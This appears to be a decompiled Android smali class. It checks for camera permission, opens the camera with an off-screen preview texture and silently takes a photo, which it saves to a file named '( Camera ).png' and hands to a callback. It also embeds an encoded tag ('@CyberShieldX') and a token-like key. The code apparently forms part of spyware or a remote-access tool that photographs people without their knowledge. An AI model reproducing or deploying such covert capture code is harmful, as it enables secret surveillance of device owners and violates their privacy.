.class public final Le/c;
.super Ljava/lang/Object;
.source "SourceFile"


# instance fields
.field public final a:Landroid/content/Context;

.field public final b:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    .line 1
    const-string v0, "context"

    invoke-static {p1, v0}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Le/c;->a:Landroid/content/Context;

    const-string p1, "QEN5YmVyU2hpZWxkWA==|WxBcm15AknsdklASkDS2139jScno3FNd39nvo9wn39ascn3o9nKDnF9efnDFNOFDj"

    invoke-static {p1}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Le/c;->b:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public final a(ILb/d;Lb/e;)V
    .locals 2

    .line 1
    iget-object v0, p0, Le/c;->a:Landroid/content/Context;

    const-string v1, "android.permission.CAMERA"

    invoke-static {v0, v1}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string p3, "( Camera )"

    const-string v0, ".png"

    invoke-static {p3, v0}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object p3

    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object p1

    new-instance v0, Landroid/graphics/SurfaceTexture;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {p1, v0}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V

    new-instance v1, Le/a;

    invoke-direct {v1, p3, p0, v0, p2}, Le/a;-><init>(Ljava/io/File;Le/c;Landroid/graphics/SurfaceTexture;Lb/d;)V

    const/4 p2, 0x0

    invoke-virtual {p1, p2, p2, v1}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    goto :goto_0

    :cond_0
    invoke-virtual {p3}, Lb/e;->f()Ljava/lang/Object;

    :goto_0
    return-void
.end method
